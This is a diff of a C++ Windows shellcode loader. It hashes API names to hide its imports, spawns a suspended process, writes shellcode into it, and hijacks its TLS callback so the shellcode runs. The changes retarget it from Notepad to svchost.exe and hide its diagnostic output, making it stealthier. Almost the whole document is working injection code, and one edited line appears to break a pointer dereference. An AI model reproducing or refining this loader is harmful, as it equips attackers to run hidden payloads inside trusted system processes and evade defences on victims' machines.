@@ -1,8 +1,7 @@
-#include <string>
-#include <iostream>
 #include <cstdio>
 #include <windows.h>
 #include <winternl.h>
+#include "structs.hpp"
 
 #define SEED 5
 
@@ -38,7 +37,7 @@ PIMAGE_EXPORT_DIRECTORY GetImageExportDirectory(PBYTE pBase, IMAGE_OPTIONAL_HEAD
 
 // Custom GetProcAddress
 FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
-    auto pBase = (PBYTE)hModule; // Get DLL base addr
+    auto pBase = reinterpret_cast<PBYTE>(hModule); // Get DLL base addr
 
     PIMAGE_DOS_HEADER pImageDosHeader = GetImageDosHeader(pBase);
     if (!pImageDosHeader) return NULL;
@@ -50,21 +49,21 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
     PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = GetImageExportDirectory(pBase, imageOptionalHeader);
     if (!pImageExportDirectory) return NULL;
 
-    auto FunctionNameArray = (PDWORD)(pBase + pImageExportDirectory->AddressOfNames);
-    auto FunctionAddressArray = (PDWORD)(pBase + pImageExportDirectory->AddressOfFunctions);
-    auto FunctionalOrdinalArray = (PWORD)(pBase + pImageExportDirectory->AddressOfNameOrdinals);
+    auto FunctionNameArray = reinterpret_cast<PDWORD>(pBase + pImageExportDirectory->AddressOfNames);
+    auto FunctionAddressArray = reinterpret_cast<PDWORD>(pBase + pImageExportDirectory->AddressOfFunctions);
+    auto FunctionalOrdinalArray = reinterpret_cast<PWORD>(pBase + pImageExportDirectory->AddressOfNameOrdinals);
 
     // Loop through exported functions in DLL
     for (DWORD i = 0;
 
     i < pImageExportDirectory->NumberOfFunctions; i++) {
         // Get function name and address
-        auto pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
-        auto pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionalOrdinalArray[i]]);
+        auto pFunctionName = reinterpret_cast<CHAR*>(pBase + FunctionNameArray[i]);
+        auto pFunctionAddress = reinterpret_cast<PVOID>(pBase + FunctionAddressArray[FunctionalOrdinalArray[i]]);
 
         // If hash matches, we got the right function
         if (dwApiNameHash == HashStringSdbm((const char*)pFunctionName)) {
-            return (FARPROC)pFunctionAddress;
+            return reinterpret_cast<FARPROC>(pFunctionAddress);
         }
     }
     return NULL;
@@ -72,90 +71,20 @@ FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
 
 // Implementation of helper functions
 PIMAGE_DOS_HEADER GetImageDosHeader(PBYTE pBase) {
-    auto pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
+    auto pImgDosHdr = reinterpret_cast<PIMAGE_DOS_HEADER>(pBase);
     if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
     return pImgDosHdr;
 }
 
 PIMAGE_NT_HEADERS GetImageNtHeaders(PBYTE pBase, PIMAGE_DOS_HEADER pImgDosHdr) {
-    auto pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
+    auto pImgNtHdrs = reinterpret_cast<PIMAGE_NT_HEADERS>(pBase + pImgDosHdr->e_lfanew);
     if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) return NULL;
     return pImgNtHdrs;
 }
 
 PIMAGE_EXPORT_DIRECTORY GetImageExportDirectory(PBYTE pBase, IMAGE_OPTIONAL_HEADER ImgOptHdr) {
-    return (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    return reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 }
-
-// Hashed function type definitions
-typedef PVOID(WINAPI* fnRtlSecureZeroMemory)(
-    PVOID ptr,
-    SIZE_T cnt
-    );
-
-typedef BOOL(WINAPI* fnCreateProcessW)(
-    LPCWSTR lpApplicationName,
-    LPWSTR lpCommandLine,
-    LPSECURITY_ATTRIBUTES lpProcessAttributes,
-    LPSECURITY_ATTRIBUTES lpThreadAttributes,
-    BOOL bInheritHandles,
-    DWORD dwCreationFlags,
-    LPVOID lpEnvironment,
-    LPCWSTR lpCurrentDirectory,
-    LPSTARTUPINFOW lpStartupInfo,
-    LPPROCESS_INFORMATION lpProcessInformation
-    );
-
-typedef LPVOID(WINAPI* fnVirtualAllocEx)(
-    HANDLE hProcess,
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD flAllocationType,
-    DWORD flProtect
-    );
-
-typedef BOOL(WINAPI* fnWriteProcessMemory)(
-    HANDLE hProcess,
-    LPVOID lpBaseAddress,
-    LPCVOID lpBuffer,
-    SIZE_T nSize,
-    SIZE_T *lpNumberOfBytesWritten
-    );
-
-typedef BOOL(WINAPI* fnVirtualProtectEx)(
-    HANDLE hProcess,
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD flNewProtect,
-    PDWORD lpflOldProtect
-    );
-
-typedef BOOL(WINAPI* fnVirtualFreeEx)(
-    HANDLE hProcess,
-    LPVOID lpAddress,
-    SIZE_T dwSize,
-    DWORD dwFreeType
-    );
-
-typedef HRSRC(WINAPI* fnFindResource)(
-    HMODULE hModule,
-    LPCSTR lpName,
-    LPCSTR lpType
-    );
-
-typedef HGLOBAL(WINAPI* fnLoadResource)(
-    HMODULE hModule,
-    HRSRC hResInfo
-    );
-
-typedef DWORD(WINAPI* fnSizeofResource)(
-    HMODULE hModule,
-    HRSRC   hResInfo
-    );
-
-typedef LPVOID(WINAPI* fnLockResource)(
-    HGLOBAL hResData
-    );
 
 // First shellcode - Based on: https://github.com/CCob/ThreadlessInject/blob/master/ThreadlessInject/Program.cs#L67
 unsigned char g_FixedShellcode[] = {
@@ -187,7 +116,7 @@ BOOL PatchShellcode(IN HANDLE hProcess, IN ULONG_PTR uImgTlsCallback) {
         goto _END_OF_FUNC;
     }
 
-    ullOriginalBytes = *reinterpret_cast<unsigned long long*>(uImgTlsCallbackBytes);
+    ullOriginalBytes = uImgTlsCallbackBytes;
 
     // Copy uImgTlsCallback
     memcpy(&g_FixedShellcode[12], &uImgTlsCallback, sizeof(uImgTlsCallback));
@@ -306,28 +235,41 @@ BOOL ChangeRemoteTLSCallbackArray(IN HANDLE hProcess, IN HANDLE hThread, IN PBYT
     size_t elementSize = sizeof(PEB::Reserved3[0]);
     size_t specificElementOffset = reserved3Offset + elementSize;
     PVOID specificElementAddress = (char*)(ThreadContext.Rdx) + specificElementOffset;
+#ifdef DEBUG
     printf("[i] PPEB Address: 0x%p \n", (void*)ThreadContext.Rdx);
     printf("[i] Calculated Image Base Address To Be At: 0x%p \n", specificElementAddress);
+#endif
 
     if (!ReadProcessMemory(hProcess, specificElementAddress, &uImageBase, sizeof(PVOID), NULL)) {
+#ifdef DEBUG
         printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+#endif
+
         return FALSE;
     }
 
     printf("[i] Image Base Address: 0x%p \n", (void*)uImageBase);
 
     if (!(uImageBaseBuffer = (ULONG_PTR)LocalAlloc(LPTR, 0x1000))) {
+#ifdef DEBUG
         printf("[i] LocalAlloc [%d] Failed With Error: %d \n", __LINE__, GetLastError());
+#endif
+
         return FALSE;
     }
 
     if (!ReadProcessMemory(hProcess, (PVOID)uImageBase, (LPVOID)uImageBaseBuffer, 0x1000, NULL)) {
+#ifdef DEBUG
         printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+#endif
+
         goto _END_OF_FUNC;
     }
 
     printf("[#] Press <ENTER> To Continue ... ");
     getchar();
+    fflush(stdin);
+    fflush(stdout);
 
     pImgNtHdrs = (PIMAGE_NT_HEADERS)(uImageBaseBuffer + ((PIMAGE_DOS_HEADER)uImageBaseBuffer)->e_lfanew);
     if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE) {
@@ -336,45 +278,68 @@ BOOL ChangeRemoteTLSCallbackArray(IN HANDLE hProcess, IN HANDLE hThread, IN PBYT
 
     pEntryTLSDataDir = &pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
     if (!pEntryTLSDataDir->Size) {
+#ifdef DEBUG
         printf("[!] Remote Process Does Not Have Any TLS Callback Function\n");
+#endif
+
         goto _END_OF_FUNC;
     }
 
     if (!ReadProcessMemory(hProcess, (LPCVOID)(uImageBase + pEntryTLSDataDir->VirtualAddress + offsetof(IMAGE_TLS_DIRECTORY, AddressOfCallBacks)), &pImgTlsCallback, sizeof(PVOID), NULL)) {
+#ifdef DEBUG
         printf("[!] ReadProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+#endif
+
         goto _END_OF_FUNC;
     }
 
+#ifdef DEBUG
     printf("[*] pImgTlsCallback Should Be At: 0x%p \n", (void*)(uImageBase + pEntryTLSDataDir->VirtualAddress + offsetof(IMAGE_TLS_DIRECTORY, AddressOfCallBacks)));
     printf("[*] pImgTlsCallback: 0x%p \n", pImgTlsCallback);
     printf("[#] Press <ENTER> To Continue ... ");
     getchar();
-
     printf("[i] Patching First Shellcode ...\n");
+#endif
+
+
     if (!PatchShellcode(hProcess, (ULONG_PTR)pImgTlsCallback)) {
         goto _END_OF_FUNC;
     }
+
+#ifdef DEBUG
     printf("[+] DONE \n");
+#endif
 
     if (!WritePayloadRemotely(hProcess, pShellcodeBuffer, sShellcodeSize, (PBYTE*)&uInjectionAddress)) {
         goto _END_OF_FUNC;
     }
 
+#ifdef DEBUG
     printf("[*] Shellcode Injected At: 0x%p \n", (void*)uInjectionAddress);
     printf("[#] Press <ENTER> To Continue ... ");
     getchar();
+#endif
+
 
     if (!VirtualProtectEx(hProcess, (LPVOID)pImgTlsCallback, 0x400, PAGE_READWRITE, &dwOldProtection)){
+#ifdef DEBUG
         printf("[!] VirtualProtectEx [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+#endif
+
         goto _END_OF_FUNC;
     }
 
     if (!WriteProcessMemory(hProcess, (LPVOID)pImgTlsCallback, &uInjectionAddress, sizeof(PVOID), NULL)) {
+#ifdef DEBUG
         printf("[!] WriteProcessMemory [%d] Failed With Error: %d\n", __LINE__, GetLastError());
+#endif
+
         goto _END_OF_FUNC;
     }
 
+#ifdef DEBUG
     printf("[+] TLS Callback Changed To Point To: 0x%p \n", (void*)uInjectionAddress);
+#endif
 
     bResult = TRUE;
 
@@ -398,22 +363,31 @@ unsigned char rawData[] = {
 
 int main() {
     PROCESS_INFORMATION	ProcessInfo		= { 0x00 };
-    WCHAR			szProcessName[]		= L"C:\\Windows\\System32\\Notepad.exe";
+    WCHAR			szProcessName[]		= L"C:\\Windows\\System32\\svchost.exe";
 
     // Create a suspended process
     if (!CreateProcessViaWinAPIsW(szProcessName, CREATE_SUSPENDED, &ProcessInfo)) {
-        std::cout << "Failed to create process\n";
+#ifdef DEBUG
+        printf("Failed to create process\n");
+#endif
+
         return -1;
     }
 
     if (!ProcessInfo.hProcess || !ProcessInfo.hThread) {
-        std::cout << "ProcessInfo is NULL\n";
+#ifdef DEBUG
+        printf("ProcessInfo is NULL\n");
+#endif
+
         return -1;
     }
 
     if (!ChangeRemoteTLSCallbackArray(ProcessInfo.hProcess, ProcessInfo.hThread, rawData, sizeof(rawData))) {
         TerminateProcess(ProcessInfo.hProcess, 0);
-        std::cout << "Failed to change TLS call back array\n";
+#ifdef DEBUG
+        printf("Failed to change TLS call back array\n");
+#endif
+
         return -1;
     }
 
